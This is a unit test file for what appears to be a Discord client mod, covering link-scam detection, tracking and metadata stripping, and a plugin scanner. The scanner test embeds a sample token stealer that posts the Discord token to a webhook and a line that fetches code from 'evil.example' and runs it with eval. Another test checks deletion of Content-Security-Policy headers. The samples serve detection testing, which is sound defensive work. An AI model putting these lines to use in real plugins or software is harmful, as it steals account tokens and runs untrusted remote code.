// Unit tests for pure modules (Node type-stripping loads the .ts files directly).
import { test } from "node:test";
import assert from "node:assert/strict";
import * as LA from "../src/shared/linkAnalysis.ts";
import { matchPatternToRegExp, isTrackingUrl, stripCsp } from "../src/main/webRequest.ts";
import { parseMeta } from "../src/shared/meta.ts";
import { normalizeSettings, isPluginEnabled } from "../src/shared/settings.ts";

test("registrable domain", () => {
    assert.equal(LA.registrableDomain("a.b.discord.com"), "discord.com");
    assert.equal(LA.registrableDomain("shop.example.co.uk"), "example.co.uk");
    assert.equal(LA.registrableDomain("user.github.io"), "user.github.io");
});

test("typosquatting", () => {
    for (const host of ["disc0rd.com", "dlscord.com", "discorcl.gift", "steamcomrnunity.com", "steamcommunlty.ru", "paypa1.com", "youtub3.com", "githuh.com", "rob1ox.com", "discord.click", "discord.com.verify-login.ru", "discord-nitro.com", "freediscord.gift"]) {
        assert.ok(LA.detectTyposquat(host), `should flag ${host}`);
    }
    for (const host of ["discord.com", "cdn.discordapp.com", "discord.gg", "discogs.com", "github.com", "gist.github.com", "paypal.de", "youtube.com", "m.youtube.com", "google.com", "reddit.com", "store.steampowered.com", "example.org"]) {
        assert.equal(LA.detectTyposquat(host), null, `should NOT flag ${host}`);
    }
});

test("spoofed link text", () => {
    assert.equal(LA.detectSpoof("https://scam.xyz/gift", "discord.com/gift/abc"), "discord.com/gift/abc");
    assert.equal(LA.detectSpoof("https://discord.com/gift/abc", "https://discord.com/gift/abc"), null);
    assert.equal(LA.detectSpoof("https://www.github.com/x", "github.com/x"), null);
    assert.equal(LA.detectSpoof("https://evil.ru", "click here"), null);
    assert.equal(LA.detectSpoof("https://cdn.example.com/files/setup.exe", "setup.exe"), null);
    assert.equal(LA.detectSpoof("https://evil.ru/x", "https://discord.zip/gift"), "https://discord.zip/gift");
});

test("tracking parameter stripping", () => {
    const r = LA.stripTracking("https://example.com/p?utm_source=x&id=7&fbclid=abc&gclid=1");
    assert.equal(r.url, "https://example.com/p?id=7");
    assert.deepEqual(r.removed.sort(), ["fbclid", "gclid", "utm_source"]);
    assert.equal(LA.stripTracking("https://youtu.be/abc?si=XYZ&t=30").url, "https://youtu.be/abc?t=30");
    assert.equal(LA.stripTracking("https://example.com/?si=keep").url, "https://example.com/?si=keep");
    assert.equal(LA.stripTracking("https://www.amazon.com/dp/B000/ref=sr_1_1?psc=1").url, "https://www.amazon.com/dp/B000");
});

test("shorteners & executables & internal", () => {
    assert.ok(LA.isShortener("bit.ly") && LA.isShortener("www.tinyurl.com") && LA.isShortener("t.co"));
    assert.ok(!LA.isShortener("github.com"));
    assert.equal(LA.detectExecutable("https://cdn.discordapp.com/attachments/1/2/free_nitro.exe"), "free_nitro.exe");
    assert.equal(LA.detectExecutable("https://x.com/a/script.PS1?x=1"), "script.PS1");
    assert.equal(LA.detectExecutable("https://example.com/"), null);
    assert.equal(LA.detectExecutable("https://example.com/app.js"), null);
    assert.ok(LA.isDiscordInternal("https://discord.com/channels/1/2"));
    assert.ok(!LA.isDiscordInternal("https://cdn.discordapp.com/attachments/a.exe"));
});

test("webRequest match patterns & telemetry", () => {
    const re = matchPatternToRegExp("*://*.discord.com/api/*");
    assert.ok(re.test("https://discord.com/api/v9/users"));
    assert.ok(re.test("https://canary.discord.com/api/v9/users"));
    assert.ok(!re.test("https://discord.com.evil.ru/api/x"));
    assert.ok(isTrackingUrl("https://discord.com/api/v9/science"));
    assert.ok(isTrackingUrl("https://ptb.discord.com/api/v10/track"));
    assert.ok(isTrackingUrl("https://o64374.ingest.sentry.io/api/1/envelope/"));
    assert.ok(!isTrackingUrl("https://discord.com/api/v9/channels/1/messages"));
    const h = { "Content-Security-Policy": ["x"], "content-security-policy-report-only": ["y"], "X-Other": ["z"] };
    stripCsp(h);
    assert.deepEqual(Object.keys(h), ["X-Other"]);
});

test("BetterDiscord meta parser", () => {
    const m = parseMeta("/**\n * @name Midnight\n * @author refact0r\n * @description A dark,\n *   rounded theme\n * @version 2.0.1\n */\n.x{}", "fallback");
    assert.equal(m.name, "Midnight");
    assert.equal(m.author, "refact0r");
    assert.equal(m.description, "A dark, rounded theme");
    assert.equal(m.version, "2.0.1");
    assert.equal(parseMeta(".x{}", "file").name, "file");
    assert.equal(parseMeta('//META{"name":"Legacy","author":"Old"}*//\nclass Legacy{}', "f").name, "Legacy");
});

test("settings normalization", () => {
    const s = normalizeSettings({ language: "it", performance: { maxOldSpaceSize: "bad" }, plugins: { fakeNitro: { enabled: true } } });
    assert.equal(s.language, "it");
    assert.equal(s.performance.maxOldSpaceSize, 512);
    assert.ok(isPluginEnabled(s, "fakeNitro"));
    assert.ok(isPluginEnabled(s, "noTrack"));
    assert.ok(!isPluginEnabled(s, "messageLogger"));
});

import { toFunctionExpression } from "../src/shared/patchUtils.ts";
test("code patch: method-shorthand factories become valid expressions", () => {
    for (const src of ['247775(e,t,n){"use strict";return 1}', 'abc(e){return 2}', 'function(e){return 3}', "(e,t)=>4", "async foo(e){return 5}"]) {
        const fn = (0, eval)("0," + toFunctionExpression(src));
        assert.equal(typeof fn, "function", src);
    }
    assert.equal((0, eval)("0," + toFunctionExpression('247775(e,t,n){return e+t+n}'))(1, 2, 3), 6);
});

import { stripMetadata, sniff, randomFileName } from "../src/shared/metadata.ts";
import { scanPlugin } from "../src/renderer/core/pluginScanner.ts";

function crc32(buf) {
    let c, crc = 0xffffffff;
    for (const b of buf) {
        c = (crc ^ b) & 0xff;
        for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
        crc = (crc >>> 8) ^ c;
    }
    return (crc ^ 0xffffffff) >>> 0;
}
function pngChunk(type, data) {
    const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
    const td = Buffer.concat([Buffer.from(type, "ascii"), data]);
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(td));
    return Buffer.concat([len, td, crc]);
}

test("metadata: PNG text/eXIf chunks removed, image chunks kept", () => {
    const png = Buffer.concat([
        Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
        pngChunk("IHDR", Buffer.alloc(13)),
        pngChunk("tEXt", Buffer.from("GPS\0 45.1,9.2")),
        pngChunk("eXIf", Buffer.from("MM\0*fake")),
        pngChunk("IDAT", Buffer.from([1, 2, 3])),
        pngChunk("IEND", Buffer.alloc(0))
    ]);
    const out = Buffer.from(stripMetadata(new Uint8Array(png)));
    assert.equal(sniff(out), "png");
    assert.ok(!out.includes(Buffer.from("tEXt")) && !out.includes(Buffer.from("eXIf")));
    assert.ok(out.includes(Buffer.from("IHDR")) && out.includes(Buffer.from("IDAT")) && out.includes(Buffer.from("IEND")));
});

test("metadata: JPEG APP1/COM removed, scan data untouched", () => {
    const jpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46, 0xff, 0xe1, 0x00, 0x06, 0x45, 0x78, 0x69, 0x66, 0xff, 0xfe, 0x00, 0x04, 0x68, 0x69, 0xff, 0xda, 0x00, 0x02, 0xaa, 0xbb, 0xff, 0xd9]);
    const out = Buffer.from(stripMetadata(new Uint8Array(jpeg)));
    assert.deepEqual([...out], [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46, 0xff, 0xda, 0x00, 0x02, 0xaa, 0xbb, 0xff, 0xd9]);
});

test("metadata: WebP EXIF/XMP chunks removed + RIFF size fixed", () => {
    const chunk = (type, data) => { const h = Buffer.alloc(8); h.write(type, 0, "ascii"); h.writeUInt32LE(data.length, 4); return Buffer.concat([h, data, data.length & 1 ? Buffer.alloc(1) : Buffer.alloc(0)]); };
    const vp8x = Buffer.alloc(10); vp8x[0] = 0x08 | 0x04;
    const body = Buffer.concat([Buffer.from("WEBP"), chunk("VP8X", vp8x), chunk("VP8 ", Buffer.from([1, 2, 3, 4])), chunk("EXIF", Buffer.from("gps!")), chunk("XMP ", Buffer.from("<x/>"))]);
    const riff = Buffer.concat([Buffer.from("RIFF"), Buffer.from([0, 0, 0, 0]), body]);
    riff.writeUInt32LE(body.length, 4);
    const out = Buffer.from(stripMetadata(new Uint8Array(riff)));
    assert.equal(sniff(out), "webp");
    assert.ok(!out.includes(Buffer.from("EXIF")) && !out.includes(Buffer.from("XMP ")));
    assert.equal(out.readUInt32LE(4), out.length - 8);
    assert.equal(out[20] & 0x0c, 0, "VP8X EXIF/XMP flags cleared");
});

test("metadata: random file names keep extension and SPOILER_ prefix", () => {
    assert.match(randomFileName("my holiday.JPG"), /^[0-9a-f]{12}\.jpg$/);
    assert.match(randomFileName("SPOILER_secret.png"), /^SPOILER_[0-9a-f]{12}\.png$/);
});

test("plugin scanner: flags token stealers, passes normal plugins", () => {
    const stealer = `module.exports = class { start() { const t = BdApi.Webpack.getModule(m => m.getToken).getToken(); fetch("https://discord.com/api/webhooks/123/abc", { method: "POST", body: t }); } };`;
    assert.equal(scanPlugin(stealer).risk, "high");
    const remote = `fetch("https://evil.example/p.js").then(r => r.text()).then(code => eval(code));`;
    assert.equal(scanPlugin(remote).risk, "high");
    const normal = `module.exports = class { start() { BdApi.DOM.addStyle("x", ".a{}"); } stop() { BdApi.DOM.removeStyle("x"); } };`;
    assert.equal(scanPlugin(normal).risk, "low");
});

import { parseWhen, convertTimestamps, unindentCode, capitalize, formatDuration } from "../src/shared/text.ts";
test("smart timestamps", () => {
    const now = new Date(2026, 10, 16, 12, 0, 0);
    assert.equal(convertTimestamps("meet at {{18:30}}", now), `meet at <t:${Math.round(new Date(2026, 10, 16, 18, 30).getTime() / 1000)}:t>`);
    assert.equal(parseWhen("in 2h", now).unix, Math.round(now.getTime() / 1000) + 7200);
    assert.equal(parseWhen("+30m", now).style, "R");
    assert.equal(parseWhen("24/12/2026 20:00", now).unix, Math.round(new Date(2026, 11, 24, 20, 0).getTime() / 1000));
    assert.equal(parseWhen("2026-12-24|F", now).style, "F");
    assert.equal(convertTimestamps("{{not a time}} and {{25:99}}", now), "{{not a time}} and {{25:99}}");
});
test("unindent code blocks", () => {
    assert.equal(unindentCode("```js\n    if (a) {\n        b();\n    }\n```"), "```js\nif (a) {\n    b();\n}\n```");
    assert.equal(unindentCode("no code here"), "no code here");
});
test("auto capitalize keeps links and code", () => {
    assert.equal(capitalize("hello there. how are you? i am fine"), "Hello there. How are you? I am fine");
    assert.equal(capitalize("see https://example.com/abc. ok `code here`"), "See https://example.com/abc. Ok `code here`");
    assert.equal(capitalize("/giphy cat"), "/giphy cat");
});
test("call timer format", () => {
    assert.equal(formatDuration(65_000), "1:05");
    assert.equal(formatDuration(3_725_000), "1:02:05");
});
